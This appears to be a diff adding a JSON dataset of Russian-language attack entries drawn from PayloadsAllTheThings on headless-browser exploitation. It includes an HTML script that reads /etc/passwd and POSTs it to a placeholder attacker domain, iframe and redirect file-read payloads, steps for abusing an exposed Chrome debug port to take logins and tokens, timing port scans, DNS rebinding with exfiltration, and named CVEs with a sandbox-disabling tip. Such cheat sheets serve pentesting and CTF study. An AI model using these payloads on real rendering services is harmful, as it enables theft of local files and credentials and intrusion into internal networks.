@@ -1,0 +1,97 @@
+{
+  "category": "Headless Browser",
+  "source": "PayloadsAllTheThings/Headless Browser/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое headless-браузер и где встречается",
+      "language": "text",
+      "tags": ["headless", "methodology"],
+      "body": "Headless-браузер (Chrome/Firefox/Edge без GUI) интерпретирует HTML/CSS/JS в фоне. Применяется для скрапинга, тестов, генерации PDF и скриншотов.\nАтака возникает, когда атакующий контролирует URL/HTML, который рендерит серверный headless-браузер → чтение локальных файлов, SSRF, скан портов."
+    },
+    {
+      "subcategory": "Команды",
+      "title": "Запуск headless (Chrome / Firefox / Edge)",
+      "language": "bash",
+      "tags": ["headless", "chrome", "pdf"],
+      "body": "google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com\nfirefox --screenshot https://www.google.com\n\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --disable-gpu --window-size=1280,720 --screenshot=\"C:\\tmp\\screen.png\" \"https://google.com\""
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Небезопасные флаги (--allow-file-access)",
+      "language": "bash",
+      "tags": ["headless", "file-read", "flags"],
+      "body": "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir"
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "Эксфильтрация /etc/passwd через fetch",
+      "language": "html",
+      "tags": ["headless", "file-read", "exfil"],
+      "body": "<script>\n  async function getFlag(){\n    response = await fetch(\"file:///etc/passwd\");\n    flag = await response.text();\n  fetch(\"https://[ATTACKER.DOMAIN.TLD]/\", { method: \"POST\", body: flag})\n  };\n  getFlag();\n</script>"
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "PDF-рендеринг — JS-редирект на файл",
+      "language": "html",
+      "tags": ["headless", "pdf", "file-read"],
+      "body": "<html>\n    <body>\n        <script>\n            window.location=\"/etc/passwd\"\n        </script>\n    </body>\n</html>"
+    },
+    {
+      "subcategory": "Чтение файлов",
+      "title": "PDF-рендеринг — iframe на файл",
+      "language": "html",
+      "tags": ["headless", "pdf", "file-read"],
+      "body": "<html>\n    <body>\n        <iframe src=\"/etc/passwd\" height=\"640\" width=\"640\"></iframe>\n    </body>\n</html>"
+    },
+    {
+      "subcategory": "Remote Debugging Port",
+      "title": "Что такое debug-порт (9222)",
+      "language": "text",
+      "tags": ["headless", "debug-port", "devtools"],
+      "body": "Remote Debugging Port открывает DevTools Protocol по TCP, чтобы внешние тулзы управляли браузером. Обычно порт 9222, меняется через --remote-debugging-port=.\nЦель: google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html\nПрим.: с Chrome 136 нужен ещё --user-data-dir на нестандартную папку; с дек.2022 для подключения по websocket нужен --remote-allow-origins=\"*\"."
+    },
+    {
+      "subcategory": "Remote Debugging Port",
+      "title": "Эксплуатация debug-порта",
+      "language": "text",
+      "tags": ["headless", "debug-port", "exploitation"],
+      "body": "• Подключиться: chrome://inspect/#devices, opera://inspect/#devices\n• Убить браузер и запустить с --restore-last-session → доступ к вкладкам юзера\n• Данные настроек (логины/пароли/токены): chrome://settings\n• Скан портов: в цикле открывать http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>\n• Лик UUID: iframe на http://127.0.0.1:<port>/json/version\n• Чтение файлов: pich4ya/chrome_remote_debug_lfi.py\nТулзы: WhiteChocolateMacademiaNut (slyd0g), ripWCMN.py."
+    },
+    {
+      "subcategory": "Remote Debugging Port",
+      "title": "Лик через /json/version (webSocketDebuggerUrl)",
+      "language": "json",
+      "tags": ["headless", "debug-port", "leak"],
+      "body": "{\n    \"Browser\": \"Chrome/136.0.7103.113\",\n    \"Protocol-Version\": \"1.3\",\n    \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/136.0.0.0 Safari/537.36\",\n    \"webSocketDebuggerUrl\": \"ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87\"\n}"
+    },
+    {
+      "subcategory": "Remote Debugging Port",
+      "title": "Node inspector (--inspect) — то же, что debug-порт",
+      "language": "bash",
+      "tags": ["headless", "node", "inspect"],
+      "body": "node --inspect app.js          # порт по умолчанию 9229\nnode --inspect=4444 app.js     # кастомный порт 4444\nnode --inspect=0.0.0.0:4444 app.js"
+    },
+    {
+      "subcategory": "Сеть",
+      "title": "Port Scanning — тайминговая атака",
+      "language": "text",
+      "tags": ["headless", "port-scan", "timing"],
+      "body": "• Динамически вставляй <img> на гипотетически закрытый порт, замеряй время до onerror.\n• Повтори ≥10 раз → среднее время ошибки для закрытого порта.\n• Тестируй случайный порт 10 раз, замеряй время до ошибки.\n• Если time_to_error(random_port) > time_to_error(closed_port)*1.3 → порт открыт.\nНюанс: Chrome по умолчанию блокирует список «known ports» и доступ к локальной сети, кроме localhost через 0.0.0.0."
+    },
+    {
+      "subcategory": "Сеть",
+      "title": "DNS Rebinding через headless",
+      "language": "text",
+      "tags": ["headless", "dns-rebinding", "ssrf"],
+      "body": "Тулза: nccgroup/singularity.\n1. Chrome делает 2 DNS-запроса: A и AAAA.\n   • AAAA → валидный внешний IP\n   • A → внутренний IP\n2. Chrome приоритетно коннектится к IPv6 (evil.net).\n3. Закрыть IPv6-листенер сразу после первого ответа.\n4. Открыть iframe на evil.net.\n5. IPv6 не отвечает → Chrome фолбэк на IPv4 (внутренний).\n6. Из верхнего окна инжектить скрипт в iframe и эксфильтровать контент."
+    },
+    {
+      "subcategory": "CVE",
+      "title": "Эксплуатация через CVE браузера",
+      "language": "text",
+      "tags": ["headless", "cve", "rce"],
+      "body": "Определи браузер по User-Agent → выбери эксплойт под компонент (V8, Blink, WebKit).\nChrome: CVE-2024-9122 (WASM type confusion), CVE-2025-5419 (OOB read/write в V8).\nFirefox: CVE-2024-9680 (use-after-free).\nФлаг --no-sandbox отключает песочницу рендерера (puppeteer.launch({args:['--no-sandbox']})) — резко упрощает RCE."
+    }
+  ]
+}
